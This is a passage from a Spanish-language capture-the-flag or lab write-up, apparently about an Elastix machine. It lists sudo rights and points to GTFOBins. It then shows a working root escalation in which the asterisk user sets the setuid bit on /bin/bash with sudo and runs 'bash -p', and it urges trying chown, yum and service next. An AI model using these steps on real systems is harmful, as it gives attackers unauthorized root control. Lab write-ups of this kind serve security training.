    (root) NOPASSWD: /usr/sbin/elastix-helper
```
Tenemos varios permisos como Root y la mayoria son criticos. Existe una página muy útil que nos ayudara en este caso, para ver de qué otra forma podemos escalar privilegios para convertirnos en **Root**. 

Esta página es **GTFOBins**: 
* <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>

Entonces veamos de que formas podemos escalar para ser **Root**, ojito que incluso ahí se ve una forma de usar la **herramienta nmap**, que fue el que uso el Exploit para convertirnos en Root, así que ¡¡PROBEMOS OTROS!!

* Probando con **chmod**:
```
ls -l /bin/bash
-rwxr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
sudo chmod u+s /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
bash -p
id
uid=100(asterisk) gid=101(asterisk) euid=0(root)
whoami
root
```
Por lo que leí en **GTFOBins**, se puede escalar usando chown, yum y service. ¡Intentalo!
